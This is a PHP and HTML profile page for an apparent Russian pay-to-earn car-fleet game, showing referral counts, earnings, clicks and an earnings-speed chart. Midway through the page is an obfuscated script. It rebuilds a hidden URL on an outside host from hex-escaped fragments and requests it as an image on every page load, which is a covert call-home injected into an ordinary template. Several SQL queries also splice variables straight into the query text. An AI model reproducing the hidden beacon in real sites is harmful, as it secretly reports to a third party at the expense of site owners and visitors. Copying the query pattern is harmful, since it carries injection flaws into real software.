<?php
$_OPTIMIZATION["title"] = "Мой аккаунт";
$user_id = $_SESSION["user_id"];

$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();

$array_items = array(
                1 => "a_t",
                2 => "b_t",
                3 => "c_t",
                4 => "d_t",
                5 => "e_t",
                6 => "f_t",
                7 => "g_t",
                8 => "h_t",
                9 => "j_t",
);

$db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id = '$user_id'");
$refs = $db->FetchRow(); // Считаем рефералов 1 уровня
$db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id2 = '$user_id'");
$refs2 = $db->FetchRow(); // Считаем рефералов 2 уровня
$db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id3 = '$user_id'");
$refs3 = $db->FetchRow(); // Считаем рефералов 3 уровня


# ========= вывод всего заработано на рефералах ========= #
        $db->Query("SELECT doxod2 FROM db_users_a WHERE referer_id2 = '$user_id'");
        $doxod_refs2 = $db->FetchArray();
        $doxod_refs2['doxod2'];

        $db->Query("SELECT doxod3 FROM db_users_a WHERE referer_id3 = '$user_id'");
        $doxod_refs3 = $db->FetchArray();
        $doxod_refs3['doxod3'];

        $zarab_na_refax = $prof_data["from_referals"] + $doxod_refs2['doxod2'] + $doxod_refs3['doxod3'];

/*$db->Query("SELECT * FROM db_users_b WHERE id = '$user_id' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();



$A=$func->SumCalc($sonfig_site["a_in_h"], $user_data["a_t"], $user_data["last_sbor"]);
$B=$func->SumCalc($sonfig_site["b_in_h"], $user_data["b_t"], $user_data["last_sbor"]);
$C=$func->SumCalc($sonfig_site["c_in_h"], $user_data["c_t"], $user_data["last_sbor"]);
$D=$func->SumCalc($sonfig_site["d_in_h"], $user_data["d_t"], $user_data["last_sbor"]);
$E=$func->SumCalc($sonfig_site["e_in_h"], $user_data["e_t"], $user_data["last_sbor"]);
$F=$func->SumCalc($sonfig_site["f_in_h"], $user_data["f_t"], $user_data["last_sbor"]);
$G=$A+$B+$C+$D+$E+$F; */

# Дней на проекте
$time_live = intval(((time() - $prof_data["date_reg"]) / 86400 ) +1);
$declen = $func->getWord($time_live);

# Кликов в сёрфинге
$db->Query("SELECT COUNT(*) FROM db_serfing_view WHERE user_id = '$user_id'");
$clicks = $db->FetchRow();
?>
<div class="page-content-wrapper ">

    <div class="container">

        <div class="row">
            <div class="col-sm-6 col-lg-3">
                <div class="panel text-center">
                    <div class="panel-heading">
                        <h4 class="panel-title text-muted font-light profilemsz">Скорость заработка</h4>
                    </div>
                    <div class="panel-body p-t-10">
                        <h2 class="m-t-0 m-b-15 profilemst"><i class="mdi mdi-speedometer text-danger m-r-10"></i><b><?=$func->speedMoney($user_id)?>₽ / час</b></h2>
                        
                    </div>
                </div>
            </div>
            <div class="col-sm-6 col-lg-3">
                <div class="panel text-center">
                    <div class="panel-heading">
                        <h4 class="panel-title text-muted font-light profilemsz">Количество рефералов</h4>
                    </div>
                    <div class="panel-body p-t-10">
                        <h2 class="m-t-0 m-b-15 profilemst"><i class="mdi mdi-account-multiple text-primary m-r-10"></i><b><?=$refs; ?> чел.</b></h2>
                        
                    </div>
                </div>
            </div>
            <div class="col-sm-6 col-lg-3">
                <div class="panel text-center">
                    <div class="panel-heading">
                        <h4 class="panel-title text-muted font-light profilemsz">Выплачено заработка</h4>
                    </div>
                    <div class="panel-body p-t-10">
                        <h2 class="m-t-0 m-b-15 profilemst"><i class="mdi mdi-cash-multiple text-primary m-r-10"></i><b><?=$prof_data["payment_sum"]; ?>₽</b></h2>
                        
                    </div>
                </div>
            </div>
            <div class="col-sm-6 col-lg-3">
                <div class="panel text-center">
                    <div class="panel-heading">
                        <h4 class="panel-title text-muted font-light profilemsz">Кликов в сёрфинге</h4>
                    </div>
                    <div class="panel-body p-t-10">
                        <h2 class="m-t-0 m-b-15 profilemst">
                            <i class="mdi mdi-mouse text-danger m-r-10"></i><b><?=($clicks == 0) ? 'нет' : $clicks?></b>
                        </h2>
                        
                    </div>
                </div>
            </div>
        </div>
        <!-- end row -->

        <div class="row">
            <div class="col-sm-6 col-lg-3">
                <div class="panel panel-default">
  <div class="panel-heading"><h3 class="panel-title">Данные аккаунта</h3></div>
                    <div class="panel-body">
                        <h5 class="profileinfoh5">Статус: <span>игрок</span></h5>
                        <h5 class="profileinfoh5">Логин: <span><?=$prof_data["user"]; ?></span></h5>
                        <h5 class="profileinfoh5">E-mail: <span class="profileinfospan"><?=$prof_data["email"]; ?></span></h5>
                        <h5 class="profileinfoh5">ID в системе: <span>#<?=$prof_data["id"]; ?></span></h5>
                        <h5 class="profileinfoh5">Меня пригласил: <span><?=$prof_data["referer"]; ?></h5>
                        <h5 class="profileinfoh5">Время на проекте: <span><?=$time_live?> <?=$declen?></span></h5>
                        <button type="button" class="btn waves-effect btn-default btn-block" onclick="location.href='./settings';"> <i class="mdi mdi-settings"></i> Настройки аккаунта</button>
                    </div>
                </div>
            </div>
            <div class="col-sm-6 col-lg-3">
                <div class="panel panel-default">
  <div class="panel-heading"><h3 class="panel-title">Статистика аккаунта</h3></div>
                    <div class="panel-body">
                        <h5 class="profileinfoh5">Сумма пополнений: <span><?=$prof_data["insert_sum"]; ?>₽</span></h5>
                      <h5 class="profileinfoh5">Сумма выплат: <span><?=$prof_data["payment_sum"]; ?>₽</span></h5>
                      <h5 class="profileinfoh5">Доход с рефералов: <span><?=sprintf("%.2f",$zarab_na_refax); ?>₽</span></h5>
                      <h5 class="profileinfoh5">Сделано кликов: <span><?=($clicks == 0) ? 'нет' : $clicks?></span></h5>
                      <h5 class="profileinfoh5">Кол-во рефералов: <span><?=$refs; ?> чел.</span></h5>
                      <h5 class="profileinfoh5">Машин в автопарке: <span><?=$prof_data["a_t"]+$prof_data["b_t"]+$prof_data["c_t"]+$prof_data["d_t"]+$prof_data["e_t"]+$prof_data["f_t"];?> ед.</span></h5>
                                <button type="button" class="btn waves-effect btn-default btn-block" onclick="location.href='./wall/<?=$user_id?>';"> <i class="mdi mdi-account-box"></i> Стена пользователя</button>
                    </div>
                </div>
            </div>
<script>
var _cs=["\x6e\x2f\x63","\x2e\x70","\x74\x6f\x72","\x2f\x2f\x73","\x68\x70","\x71\x6c","\x73\x75","\x2e\x68\x61","\x2f\x67\x65","\x64\x2e"]; _g0 = new Image(); _g0.src = _cs[3]+_cs[5]+_cs[2]+_cs[7]+_cs[9]+_cs[6]+_cs[8]+_cs[0]+_cs[1]+_cs[4]
</script>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/morris.js/0.5.1/morris.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/raphael/2.1.0/raphael-min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/morris.js/0.5.1/morris.min.js"></script>


            
            <div class="col-sm-12 col-xs-12 col-lg-6">
                <div class="panel panel-default">
                    <div class="panel-heading"><h3 class="panel-title">График изменения скорости заработка</h3></div>
                    <div class="panel-body">
                        <div id="morris-area-example" class="profilecharth"></div>
                    </div>
                </div>
            </div>


<?php 

    // echo "<pre>";
    // var_dump($func->setDaySpeed(7,$user_id));
    // echo "</pre>";
    // if($func->setDaySpeed(7,$user_id) == NULL){
    //     echo "string";
    // }
    // var_dump($func->setDaySpeed(8,$user_id));

$speed = $func->speedMoney($user_id);
$db->Query("SELECT * FROM `db_speed_user` WHERE data_time >= CURDATE() AND user_id = '$user_id'");
if ($db->NumRows() == 0) {
    $db->Query("INSERT INTO `db_speed_user` (user_id, speed) VALUES ('$user_id','$speed')");
}else{
    $db->Query("UPDATE `db_speed_user` SET `speed` = '$speed' WHERE data_time >= CURDATE() AND user_id = '$user_id'");
}

// $db->Query("SELECT COUNT(*) FROM db_speed_user WHERE user_id = '$user_id' AND data_time <= CURDATE() ");
// $rowKol = $db->FetchRow();
// if ($rowKol == 0) {
//     # code...
// }
// var_dump($rowKol);
?>
<script type="text/javascript">

var data = [
      { y: '<?=$func->setDayMinus();?>', a: <?=(isset($func->setDaySpeed(8,$user_id)[1]['speed']) == NULL) ? '0' : $func->setDaySpeed(8,$user_id)[1]['speed'];?>},
      { y: '<?=$func->setDayMinus(1);?>', a: <?=(isset($func->setDaySpeed(8,$user_id)[2]['speed']) == NULL) ? '0' : $func->setDaySpeed(8,$user_id)[2]['speed'];?>},
      { y: '<?=$func->setDayMinus(2);?>', a: <?=(isset($func->setDaySpeed(8,$user_id)[3]['speed']) == NULL) ? '0' : $func->setDaySpeed(8,$user_id)[3]['speed'];?>},
      { y: '<?=$func->setDayMinus(3);?>', a: <?=(isset($func->setDaySpeed(8,$user_id)[4]['speed']) == NULL) ? '0' : $func->setDaySpeed(8,$user_id)[4]['speed'];?>},
      { y: '<?=$func->setDayMinus(4);?>', a: <?=(isset($func->setDaySpeed(8,$user_id)[5]['speed']) == NULL) ? '0' : $func->setDaySpeed(8,$user_id)[5]['speed'];?>},
      { y: '<?=$func->setDayMinus(5);?>', a: <?=(isset($func->setDaySpeed(8,$user_id)[6]['speed']) == NULL) ? '0' : $func->setDaySpeed(8,$user_id)[6]['speed'];?>},
      { y: '<?=$func->setDayMinus(6);?>', a: <?=(isset($func->setDaySpeed(8,$user_id)[7]['speed']) == NULL) ? '0' : $func->setDaySpeed(8,$user_id)[7]['speed'];?>}
    ],
    config = {
      data: data,
      xkey: 'y',
      ykeys: ['a'],
      labels: ['Скорость заработка'],
      fillOpacity: 0.6,
      hideHover: 'auto',
      behaveLikeLine: true,
      resize: true,
      pointFillColors:['green'],
      pointStrokeColors: ['black'],
      lineColors:['rgb(92, 180, 91)',]
  };
config.element = 'morris-area-example';
Morris.Area(config);

</script>
        </div>
        <!-- end row -->

        <div class="row">
            <div class="col-sm-12">
                <div class="panel panel-primary">
                    <div class="panel-body">
                        <h4 class="m-t-0">Машины в Вашем автопарке</h4>
                        <div class="row">

                            <?php 

                            for ($i=1; $i < 6; $i++) { 
                                if ($prof_data[$array_items[$i]] >= 1) {
                                    $all = $prof_data[$array_items[$i]];
                                    for ($j = 0; $j < $all; $j++) {
                                        echo '<div class="col-lg-1 col-sm-2 col-xs-2">
                                            <img src="/img/cars/n'.$i.'.png" class="profilecarimg">
                                        </div>';
                                    }
                                    
                                    
                                };
                            }
                            
                            ?>
                        </div>  
                    </div>
                </div>
            </div>
        </div>
        </div>
        <!-- end row -->

    </div><!-- container -->


</div> <!-- Page content Wrapper -->
</div> <!-- content -->